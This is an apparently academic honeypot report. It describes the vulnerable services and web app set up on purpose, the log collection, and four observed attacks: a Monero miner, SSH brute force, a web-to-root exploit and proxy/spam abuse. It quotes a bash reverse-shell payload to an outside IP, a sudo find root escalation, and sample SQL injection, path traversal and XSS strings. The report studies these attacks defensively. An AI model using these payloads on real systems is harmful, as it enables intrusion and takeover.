# Honeypot Analysis Project

## 📝 Overview

This project involved setting up and monitoring a honeypot system to **analyze attacker behavior**. The goal was to deploy a system with known vulnerabilities, log interactions, analyze the attack patterns, and implement mitigation strategies to maintain the honeypot's operation. This report details the setup, findings, and countermeasures taken during the assignment.

---

## 🛠️ Setup

### Vulnerabilities Introduced

Several vulnerabilities were intentionally configured on the honeypot machine to attract and study attackers:

* **Created Account**: An account `admin:admin` was enabled. Initially, it had limited privileges, but later granted passwordless `sudo` access to `/bin/bash` to facilitate deeper analysis.
* **Vulnerable Daemons**:
    * `vsftp 2.3.4` (CVE-2011-2523): Backdoor leading to a reverse shell.
    * `log4shell vulnerable application` (CVE-2021-44228): Allows command injection.
    * `MySQL 5.5.23` (CVE-2012-2122): Authentication bypass vulnerability.
* **Vulnerable Web Application** (`http://130.89.144.11/MyApp/`):
    * *Log Page*: Weak credentials (`admin:password`).
    * *Ping Test Tool*: Command Injection (e.g., `; ls`).
    * *Users*: SQL Injection (e.g., `' OR 1=1`).
    * *View Documents*: File Inclusion (e.g., `page=../../../../etc/passwd`).
    * *Contact Us*: Cross-Site Scripting (XSS) (e.g., `<script>alert('XSS');</script>`).
* **Weak Sudo Configuration**:
    * `www-data` user granted passwordless `sudo` access to the `find` command.
    * `admin` user granted passwordless `sudo` access to `/bin/bash` (added later).

### Logging Methods

To capture attacker activity, logs were transferred from the honeypot (`130.89.144.11`) to a separate storage machine in near real-time:

* **Real-Time Log Transfer**:
    * System and application logs (`auth.log`, `syslog`, `audit.log`, `vsftpd.log`, Apache logs, etc.) from `/var/log` were continuously transferred.
    * This used SSH and the `tail -F` command, running within detached `screen` sessions on the storage machine.
    * Logs were stored in `/home/group1/automated_honeypot_logs` on the storage machine.
* **Network Traffic Capture (Tcpdump)**:
    * SSH was enabled on port 2222 on the honeypot for secure file transfer.
    * `tcpdump` captured traffic on `eth0` (excluding port 2222 to avoid capturing SCP traffic) into a `traffic.pcap` file on the honeypot.
    * A `cron` job ran every 5 minutes to transfer the `traffic.pcap` file to the storage machine using `scp` over port 2222.

---

## 📊 Monitoring and Analysis

Analysis involved manual log review, Python scripts for parsing and visualization, and network flow analysis (though the latter yielded no significant conclusions). Four main attack scenarios were identified:

### 1. Crypto Miner ⛏️
* **Detection**: Unauthorized SSH login as `admin` from `159.65.147.93` after a short brute-force session. DNS requests to `download.c3pool.org` and an HTTP GET request for `setup_c3pool_miner.sh` were observed. Subsequent DNS requests to `auto.c3pool.org` confirmed the miner (`xmrig`) connection to the C3Pool (Monero). System logs mentioned `xmrig` during an out-of-memory event. The miner's files were found in `/home/admin/c3pool/`.
* **Outcome**: The mining activity continued for several days until the VM ran out of memory. Later logs indicated the associated Monero wallet address was banned for being linked to a Botnet. The attacker's wallet address was identified, but Monero's privacy features prevented further tracing.

### 2. Brute Force Attacks 🔒
* **Detection**: Persistent, automated SSH login attempts observed in `auth.log`. Logs showed numerous `authentication failure` entries, often targeting the `root` user from various IPs (e.g., `39.103.169.90`) across multiple ports.
* **Analysis**: Visualization showed most attempts originated from **China** (>35,000) and the **United States** (>17,000). The most targeted username was **`root`** (>60,000 attempts), followed by common default/admin names like `ubuntu`, `oracle`, `admin`, and `git`.

### 3. Web Exploit to Root via Sudo Misconfiguration 🌐➡️👑
* **Detection**: A peer tester exploited the **Command Injection** vulnerability in the web application's Ping Test Tool (`/MyApp/vulnerabilities/exec/`) from IP `145.126.74.232`. The payload `127.0.0.1; bash -c 'bash -i >& /dev/tcp/145.126.74.232/80 0>&1'` established a reverse shell as the `www-data` user.
* **Privilege Escalation**: Audit logs (`ausearch -ua www-data`) showed the attacker used `sudo find . -exec /bin/bash \; -quit` to exploit the weak sudo configuration for `www-data`, gaining a root shell.
* **Persistence**: The attacker then logged in via SSH as `group1` from the same IP (`145.126.74.232`) and injected an **SSH public key** into `/home/group1/.ssh/authorized_keys` to create a backdoor.

### 4. SSH Proxy / Tunneling 🚇
* **Detection**: A large number of outgoing HTTP requests and many persistent SSH connections on port 2222 for the `admin` user were observed. TCP captures showed both SSH traffic on port 2222 and outgoing TLS/HTTPS traffic to various external websites.
* **Analysis**: IP address analysis revealed connecting IPs primarily originated from **Moscow, Russia**. Most successful `admin` logins also came from Russia (3718 logins from 23 hosts). Domain analysis (using `tshark`) showed connections to tracking/proxy checking services, cloud infrastructure APIs (Google, Amazon), and adult/ad websites, strongly indicating proxy usage.
* **Malicious Activity**: SMTP/POP/IMAP traffic was also detected, indicating the honeypot was used for sending **spam emails**. Extracted email content pointed towards a pharmacy scam
